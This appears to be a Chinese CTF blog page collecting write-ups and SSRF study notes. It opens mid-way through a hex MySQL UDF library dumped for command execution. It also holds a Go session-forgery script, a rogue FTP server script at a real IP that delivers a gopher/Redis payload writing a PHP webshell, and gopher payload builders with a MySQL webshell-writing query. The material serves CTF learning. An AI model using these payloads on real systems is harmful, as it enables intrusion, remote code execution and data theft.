000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#39;) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;mariadb18&#x2F;plugin&#x2F;mysqludf.so&#39;;</span><br></pre></td></tr></table></figure>

<p>然后再从里面导入函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname &#39;mysqludf.so&#39;;</span><br></pre></td></tr></table></figure>

<h2 id="checkin-go"><a href="#checkin-go" class="headerlink" title="checkin_go"></a>checkin_go</h2><p>比赛的时候有找到类似的文章，但是由于go语言第一次见，当时确实有点慌了，哎可惜呀~<br>关键点在这里:<br>chekNowMoney这个值我们从代码里可以看到是cookies一定有的 并且这个值就是加密后20w的值 之后猜测可能是sessions伪造 但这个是随机生成的 查了相关资料发现 go里面的math/seed 如果没设定 默认为1 默认种子为1这就代表着我们随机数可控，那我们伪造sessions就行了 伪造一个钱数和管理员。<br>脚本:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考链接https:&#x2F;&#x2F;annevi.cn&#x2F;2020&#x2F;08&#x2F;14&#x2F;wmctf2020-gogogowriteup&#x2F;#0x04_SSRF_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96</span><br><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">&quot;github.com&#x2F;gin-contrib&#x2F;sessions&quot;</span><br><span class="line">&quot;github.com&#x2F;gin-contrib&#x2F;sessions&#x2F;cookie&quot;</span><br><span class="line">&quot;github.com&#x2F;gin-gonic&#x2F;gin&quot;</span><br><span class="line">&quot;math&#x2F;rand&quot;</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">r :&#x3D; gin.Default()</span><br><span class="line">storage :&#x3D; cookie.NewStore(randomChar(16))</span><br><span class="line">r.Use(sessions.Sessions(&quot;o&quot;, storage))</span><br><span class="line">r.GET(&quot;&#x2F;getcookies&quot;,cookieHandler)</span><br><span class="line">r.Run(&quot;0.0.0.0:8002&quot;)</span><br><span class="line">&#125;</span><br><span class="line">func cookieHandler(c *gin.Context)&#123;</span><br><span class="line">s :&#x3D; sessions.Default(c)</span><br><span class="line">s.Set(&quot;uname&quot;, &quot;admin&quot;)</span><br><span class="line">s.Set(&quot;checkNowMoney&quot;, &quot;JkeLNs0tAng7rDdgtr1nDQ&quot;)</span><br><span class="line">s.Set(&quot;checkPlayerMoney&quot;, &quot;JkeLNs0tAng7rDdgtr1nDQ&quot;)</span><br><span class="line">s.Set(&quot;nowMoney&quot;, 200000)</span><br><span class="line">s.Set(&quot;playerMoney&quot;, 200000)</span><br><span class="line">s.Save()</span><br><span class="line">&#125;</span><br><span class="line">func randomChar(l int) []byte &#123;</span><br><span class="line">output :&#x3D; make([]byte, l)</span><br><span class="line">rand.Read(output)</span><br><span class="line">return output</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="cross-the-side"><a href="#cross-the-side" class="headerlink" title="cross the side"></a>cross the side</h2><p>是ssrf打redis的题目，可惜了，没有去做一下，因为是刚学到的知识点，对着之前的笔记看看别人的题解吧:<br>gopher打redis，但是后面的连接其实我是没懂的<br>先拿个题解好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="comment"># 对gopherus生成的payload进行一次urldecode</span></span><br><span class="line">payload =</span><br><span class="line">unquote(<span class="string">&quot;%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241</span></span><br><span class="line"><span class="string">%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/%2A%22%29%3B%3F</span></span><br><span class="line"><span class="string">%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0A</span></span><br><span class="line"><span class="string">dir%0D%0A%2420%0D%0A/var/www/html/public%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%</span></span><br><span class="line"><span class="string">0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A</span></span><br><span class="line"><span class="string">1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;</span>)</span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((host, port))</span><br><span class="line">sk.listen(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># ftp被动模式的passvie port,监听到1234</span></span><br><span class="line">sk2 = socket.socket()</span><br><span class="line">sk2.bind((host, <span class="number">1234</span>))</span><br><span class="line">sk2.listen()</span><br><span class="line"><span class="comment"># 计数器，用于区分是第几次ftp连接</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">conn, address = sk.accept()</span><br><span class="line">conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>)) <span class="comment"># USER aaa\r\n 客户端传来用户名</span></span><br><span class="line"><span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">conn.send(<span class="string">b&quot;220 ready\n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">conn.send(<span class="string">b&quot;200 ready\n&quot;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>)) <span class="comment"># TYPE I\r\n 客户端告诉服务端以什么格式传输数据，TYPE</span></span><br><span class="line">I表示二进制， TYPE A表示文本</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">conn.send(<span class="string">b&quot;215 \n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>)) <span class="comment"># SIZE /123\r\n 客户端询问文件/123的大小</span></span><br><span class="line"><span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">conn.send(<span class="string">b&quot;213 3 \n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">conn.send(<span class="string">b&quot;300 \n&quot;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>)) <span class="comment"># EPSV\r\n&#x27;</span></span><br><span class="line">conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>)) <span class="comment"># PASV\r\n 客户端告诉服务端进入被动连接模式</span></span><br><span class="line"><span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line"><span class="comment"># 36.255.221.156</span></span><br><span class="line">conn.send(<span class="string">b&quot;227 36,255,221,156,4,210\n&quot;</span>) <span class="comment"># 服务端告诉客户端需要到哪个</span></span><br><span class="line">ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：<span class="number">4</span>*<span class="number">256</span>+<span class="number">210</span>=<span class="number">1234</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">&quot;第二次&quot;</span>)</span><br><span class="line">conn.send(<span class="string">b&quot;227 127,0,0,1,0,6379\n&quot;</span>) <span class="comment"># 端口计算规则：35*256+40=9000</span></span><br><span class="line">print(conn.recv(<span class="number">20</span>)) <span class="comment"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到</span></span><br><span class="line">STOR /<span class="number">123</span>\r\n</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">conn.send(<span class="string">b&quot;125 \n&quot;</span>) <span class="comment"># 告诉客户端可以开始数据连接了</span></span><br><span class="line"><span class="comment"># 新建一个socket给服务端返回我们的payload</span></span><br><span class="line">print(<span class="string">&quot;建立连接!&quot;</span>)</span><br><span class="line">conn2, address2 = sk2.accept()</span><br><span class="line">conn2.send(payload)</span><br><span class="line">conn2.close()</span><br><span class="line">print(<span class="string">&quot;断开连接!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">conn.send(<span class="string">b&quot;150 \n&quot;</span>)</span><br><span class="line">print(conn.recv(<span class="number">20</span>))</span><br><span class="line">exit()</span><br><span class="line"><span class="comment"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span></span><br><span class="line"><span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">conn.send(<span class="string">b&quot;226 \n&quot;</span>)</span><br><span class="line">conn.close()</span><br><span class="line">count += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247491162&amp;idx=1&amp;sn=273d86b4c5c4f8758face216497bd87d&amp;chksm=e8a23d8bdfd5b49dd9ea82601cc7683f9debeb91d9cda100230cc25d76d801ab58a5d1443a34&amp;mpshare=1&amp;scene=23&amp;srcid=09125Gbtvppmn5dEsykPwidl&amp;sharer_sharetime=1631456612674&amp;sharer_shareid=1a55b3791775cccd32c32b318eb9206a#rd">https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247491162&amp;idx=1&amp;sn=273d86b4c5c4f8758face216497bd87d&amp;chksm=e8a23d8bdfd5b49dd9ea82601cc7683f9debeb91d9cda100230cc25d76d801ab58a5d1443a34&amp;mpshare=1&amp;scene=23&amp;srcid=09125Gbtvppmn5dEsykPwidl&amp;sharer_sharetime=1631456612674&amp;sharer_shareid=1a55b3791775cccd32c32b318eb9206a#rd</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/12/2021%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B/">2021工控安全线上初赛</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-12</time><div class="content"><h2 id="遭到黑客攻击！"><a href="#遭到黑客攻击！" class="headerlink" title="遭到黑客攻击！"></a>遭到黑客攻击！</h2><p>打开wireshark，发现异常数据<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210909173355.png" alt="img"><br>发现是莫斯电码，解码以后就可以拿到flag</p>
<h2 id="工控协议分析"><a href="#工控协议分析" class="headerlink" title="工控协议分析"></a>工控协议分析</h2><p>这题也是赛后才做出来的，和18年的题目很像，看到有write var写入，设置筛选条件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s7comm&amp;&amp;s7comm.param.func&#x3D;&#x3D;0x05</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210910000241.png" alt="img"></p>
<p>然后拼凑起来即可</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/07/buu27/">buu27</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-07</time><div class="content"><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">&#x27;/var/babyctf/success.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;username&#x27;</span>] =<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line">$dir_path = <span class="string">&quot;/var/babyctf/&quot;</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">&quot;private&quot;</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">&quot;/&quot;</span>.$_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_path .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">&quot;uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">&quot;download&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">&#x27;filename&#x27;</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;file not exist&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: application/force-download&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Content-Length: &#x27;</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">&quot;downloaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.伪造admin的session<br>2.创建一个success.txt<br>伪造admin的sessionn感觉可以先在本地创建一个，然后再传过去：</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/01/CTF%E4%B8%AD%E5%A5%BD%E7%94%A8%E7%9A%84%E7%BD%91%E7%AB%99/">CTF中好用的网站</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-01</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/31/ssrf%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">ssrf服务端请求伪造</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-31</time><div class="content"><h2 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h2><p>SSRF是一种由攻击者构造形成由服务器发起请求的一个漏洞，让服务器去请求通常请求不到的东西。一般用来在外网探测或攻击内网服务<br>实例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url=$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="SSRF相关函数"><a href="#SSRF相关函数" class="headerlink" title="SSRF相关函数"></a>SSRF相关函数</h3><p>file_get_contents：能将url或者文件呈现给用户<br>fsockopen:能打开一个网络连接，实现对用户指定url数据的获取，传输原始数据<br>curl_exec:…..</p>
<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="读取系统文件"><a href="#读取系统文件" class="headerlink" title="读取系统文件"></a>读取系统文件</h3><h4 id="file-伪协议-读取本地文件"><a href="#file-伪协议-读取本地文件" class="headerlink" title="file://伪协议:读取本地文件"></a>file://伪协议:读取本地文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;C:&#x2F;flag.txt</span><br></pre></td></tr></table></figure>



<h4 id="gopher-协议"><a href="#gopher-协议" class="headerlink" title="gopher://协议"></a>gopher://协议</h4><p>gopher是一个信息查找系统</p>
<p>利用此协议可以攻击内网的FTP、Telnet、Redis、Mysql，可以进行get、post请求</p>
<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>1.构造http get/post请求消息<br>2.对请求消息进行url编码<br>3.将编码后的字符串中的%0A替换为%0D%0A<br><strong>4.将最终的字符串在进行一次URL编码</strong><br>5.拼接协议头、请求地址<br><strong>gopher转化脚本：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote <span class="keyword">as</span> urlencode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gopher</span>(<span class="params">data</span>):</span><span class="comment">#端口记得更换</span></span><br><span class="line"> stream = <span class="string">f&quot;&quot;&quot;POST /index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:47852</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;len(data)&#125;</span></span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;data&#125;</span>&quot;&quot;&quot;</span>.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"> g = <span class="string">&quot;gopher://127.0.0.1:47852/_&quot;</span> + urlencode(stream)</span><br><span class="line"> <span class="keyword">return</span> urlencode(g)</span><br><span class="line"></span><br><span class="line">print(gopher(<span class="string">&#x27;a=1&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>gopher可以自定义发送post以及get的请求内容</p>
<h3 id="ssrf扫描端口"><a href="#ssrf扫描端口" class="headerlink" title="ssrf扫描端口"></a>ssrf扫描端口</h3><p>可以先看/etc/hosts看ip，然后扫描端口可以从1w-2w，看题目说明，没说就是扫6w个</p>
<h3 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h3><h2 id="SSRF攻击mysql"><a href="#SSRF攻击mysql" class="headerlink" title="SSRF攻击mysql"></a>SSRF攻击mysql</h2><p><strong>原理</strong>：我们知道ssrf就是伪造服务端发起请求，这里就有个问题就是，为什么我们使用本地抓的包写入到gopher攻击数据包里面，可以打题目里面的？那就是因为在ssrf题目里面，我们发起的请求就相当于在题目的本地进行攻击了，所以效果是一样的</p>
<p>SSRF漏洞结合gopher系统攻击内网未授权mysql(即没有密码)，并获取系统shell的方法</p>
<h3 id="mysql通信协议"><a href="#mysql通信协议" class="headerlink" title="mysql通信协议"></a>mysql通信协议</h3><p>客户端连接服务器有三种方法：<br>1.unix套接字：只能在客户端和mysql服务器在同一台电脑上才行<br>2.内存共享/命名管道：window系统<br>3.TCP/IP套接字：是在任何系统下都可以使用的方式，也是使用最多的连接方式，即：mysql -h127.0.0.1 -uroot -proot<br>PS：这里不可以使用localhost，因为localhost使用的是unix的套接字</p>
<h3 id="mysql客户端与服务器的交互过程"><a href="#mysql客户端与服务器的交互过程" class="headerlink" title="mysql客户端与服务器的交互过程"></a>mysql客户端与服务器的交互过程</h3><p>mysql客户端与服务器的交互主要分为两个阶段:<br>connection phase（连接阶段或者叫认证阶段）<br>command phase(命令阶段)<br>在连接阶段包括我首保和认证包，主要关注<strong>认证数据包</strong></p>
<h3 id="构造攻击数据包"><a href="#构造攻击数据包" class="headerlink" title="构造攻击数据包"></a>构造攻击数据包</h3><p><strong>1.使用tcpdump</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -ilo0 port 3306 -w sql.pcapng</span><br></pre></td></tr></table></figure>

<p><strong>2.使用wireshark打开存储了数据包的文件</strong><br><strong>3.接下来找到Login Request的包并右键单击Follow一下里面的TCP Stream</strong><br><strong>4.执行以下操作</strong><img src="/.com//Users\10452\AppData\Roaming\Tencent\Users\1045225639\QQ\WinTemp\RichOle\7~CX2Z]Z4YQC`DF63{3AG$0.png" alt="img"></p>
<p><strong>5.将上面的数据复制下来，使用一下脚本，构造gopher攻击包：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span>(<span class="params">s</span>):</span></span><br><span class="line">    a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> iin range(<span class="number">0</span>,len(s),<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span> + <span class="string">&quot;%&quot;</span>.join(a)s=<span class="string">&#x27;&#x27;&#x27;十六进制数据流放在这里&#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(result(s)+<span class="string">&#x27;--output -&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>6.运行脚本 ，执行脚本结果</strong></p>
<h3 id="GET-SHELL"><a href="#GET-SHELL" class="headerlink" title="GET SHELL"></a>GET SHELL</h3><p>利用mysql写马：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php phpinfo(); ?&gt;&#39; into out file &quot;&#x2F;tmp&#x2F;1.php&quot;;</span><br></pre></td></tr></table></figure>

<p>然后使用gopher伪造，然后打过去<br><strong>PS：</strong>如果题目权限给的很高，或者用了比较旧的mysql版本，说明就是要让你用这个办法，否则你写过去的马将会面临一个权限问题</p>
<p>如果没有写入权限为null，那么就是用log写马即可</p>
<h2 id="SSRF攻击Redis"><a href="#SSRF攻击Redis" class="headerlink" title="SSRF攻击Redis"></a>SSRF攻击Redis</h2><h3 id="Redis通信方式"><a href="#Redis通信方式" class="headerlink" title="Redis通信方式"></a>Redis通信方式</h3><h3 id="gopher发送redis请求"><a href="#gopher发送redis请求" class="headerlink" title="gopher发送redis请求"></a>gopher发送redis请求</h3><p>用以下脚本直接打，可替换内容，然后再urlencode一下即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parseimport quote <span class="keyword">as</span> urlencode</span><br><span class="line">defgopher():</span><br><span class="line">	stream = <span class="string">f&quot;&quot;&quot;*2</span></span><br><span class="line"><span class="string">$4</span></span><br><span class="line"><span class="string">auth</span></span><br><span class="line"><span class="string">$6</span></span><br><span class="line"><span class="string">123123</span></span><br><span class="line"><span class="string">*2</span></span><br><span class="line"><span class="string">$3</span></span><br><span class="line"><span class="string">get</span></span><br><span class="line"><span class="string">$4</span></span><br><span class="line"><span class="string">name&quot;&quot;&quot;</span>.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">	g = <span class="string">&quot;gopher://127.0.0.1:8000/_&quot;</span> + urlencode(stream)</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line">print(<span class="string">&quot;curl &quot;</span>+gopher())</span><br></pre></td></tr></table></figure>

<h4 id="备份crontab反弹shell"><a href="#备份crontab反弹shell" class="headerlink" title="备份crontab反弹shell"></a>备份crontab反弹shell</h4><p>centos才能用</p>
<h4 id="备份文件写马"><a href="#备份文件写马" class="headerlink" title="备份文件写马"></a>备份文件写马</h4><p>如果redis与php在一起，可以直接写到/var/www/html/shell.php</p>
